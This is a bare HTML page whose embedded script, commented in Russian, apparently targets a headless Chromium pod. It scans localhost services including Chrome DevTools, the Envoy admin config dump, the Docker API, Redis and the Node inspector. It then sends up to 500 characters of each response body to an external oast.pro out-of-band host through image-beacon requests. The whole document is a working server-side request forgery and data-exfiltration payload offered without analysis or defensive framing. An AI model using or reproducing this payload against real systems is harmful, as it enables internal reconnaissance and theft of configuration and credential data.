<!DOCTYPE html>
<html>
<head><title>t</title></head>
<body>
<script>
var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
function fire(path) {
  new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
}

fire('/alive6?t=0');

// Сканирование localhost-портов Chromium-пода
// Таймаут 5000мс чтобы дать сервисам время ответить
// Ключевые цели:
//   9222 - Chrome DevTools Protocol (jackpot!)
//   15000 - Envoy admin
//   15090 - Envoy Prometheus metrics
//   8080, 3000, 5000 - типичные app-порты

var localPorts = [
  ['cdp-9222',    'http://127.0.0.1:9222/json'],          // Chrome DevTools - список вкладок
  ['cdp-ver',     'http://127.0.0.1:9222/json/version'],  // Chrome DevTools version
  ['envoy-admin', 'http://127.0.0.1:15000/'],             // Envoy admin
  ['envoy-stats', 'http://127.0.0.1:15000/stats'],        // Envoy stats
  ['envoy-cfg',   'http://127.0.0.1:15000/config_dump'],  // Envoy config
  ['envoy-prom',  'http://127.0.0.1:15090/stats/prometheus'], // Envoy Prometheus
  ['lo-80',       'http://127.0.0.1:80/'],
  ['lo-8080',     'http://127.0.0.1:8080/'],
  ['lo-8888',     'http://127.0.0.1:8888/'],
  ['lo-3000',     'http://127.0.0.1:3000/'],
  ['lo-5000',     'http://127.0.0.1:5000/'],
  ['lo-4000',     'http://127.0.0.1:4000/'],
  ['lo-9090',     'http://127.0.0.1:9090/api/v1/status/buildinfo'],
  ['lo-9100',     'http://127.0.0.1:9100/metrics'],       // node_exporter
  ['lo-6379',     'http://127.0.0.1:6379/'],              // Redis
  ['lo-5601',     'http://127.0.0.1:5601/'],              // Kibana
  ['lo-2375',     'http://127.0.0.1:2375/version'],       // Docker API
  ['lo-9229',     'http://127.0.0.1:9229/json'],          // Node.js inspector
  ['lo-4040',     'http://127.0.0.1:4040/'],              // Spark
  ['lo-7000',     'http://127.0.0.1:7000/'],
  ['lo-9333',     'http://127.0.0.1:9333/json'],          // Chrome debug alt
  ['lo-50051',    'http://127.0.0.1:50051/'],             // gRPC
];

localPorts.forEach(function(t) {
  var label = t[0], url = t[1], t0 = Date.now();
  fetch(url, {signal: AbortSignal.timeout(5000)})
    .then(function(r) {
      return r.text().then(function(body) {
        fire('/lo-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
      });
    })
    .catch(function(e) {
      var ms = Date.now() - t0;
      // Только успехи и быстрые ответы - не шлём 5000мс таймауты (слишком много)
      if (ms < 4900 || e.message.indexOf('timed') === -1) {
        fire('/lo-err-' + label + '?ms=' + ms + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
      } else {
        fire('/lo-to-' + label + '?ms=' + ms);
      }
    });
});
</script>
</body>
</html>
